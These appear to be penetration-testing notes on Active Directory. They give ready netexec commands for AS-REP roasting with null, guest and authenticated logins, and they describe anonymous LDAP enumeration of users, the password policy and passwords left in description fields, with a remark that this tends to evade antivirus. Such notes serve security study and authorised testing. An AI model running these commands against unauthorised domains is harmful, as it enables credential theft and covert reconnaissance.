
#### ASReproasting
- always check for NULL sessions (EASY win) 
```bash
netexec ldap $IP -u '' -p '' --asreproast asrep.txt
```


**_NOTE:This lets me know that the guest account is disabled._**

```bash
netexec ldap $IP -u guest -p '' --asreproast asrep.txt
```

- authenticated
```bash
netexec ldap $IP -u 'USER' -p 'PASS' --asreproast asrep.txt
```


#### Using LDAP anonymous bind to enumerate further:

- If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    
    - We can actually retrieve a significant amount of information via anonymous bind such as:
        - A list of all users
        - A list of all groups
        - A list of all computers.
        - User account attributes.
        - The domain password policy.
        - Enumerate users who are susceptible to AS-REPRoasting.
        - Passwords stored in the description fields
    - The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.
- I actually have a handy script to check if anonymous bind is enabled & if it is to dump a large amount of information. You can find it here
    
    - [https://github.com/bloodstiller/ldapire](https://github.com/bloodstiller/ldapire)